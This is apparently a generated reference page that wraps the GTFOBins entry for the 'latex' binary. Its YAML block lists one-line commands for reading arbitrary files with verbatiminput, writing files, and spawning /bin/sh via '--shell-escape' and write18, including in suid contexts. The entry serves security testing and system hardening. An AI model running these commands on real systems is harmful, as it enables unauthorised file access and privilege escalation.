---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# latex

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `latex` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latex` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [latex](../../tools/linux/latex.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | latex |
| name | latex |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/latex/ |

## Preserved Source Material

```yaml
_body: ''
_name: latex
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latex
functions:
  file-read:
  - code: 'latex ''\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}''

      strings texput.dvi'
    comment: The read file will be part of the PDF output.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - code: latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
    comment: The file can only be written in the current directory, and the `.tex` extension is mandatory.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: latex --shell-escape '\immediate\write18{/bin/sh}'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
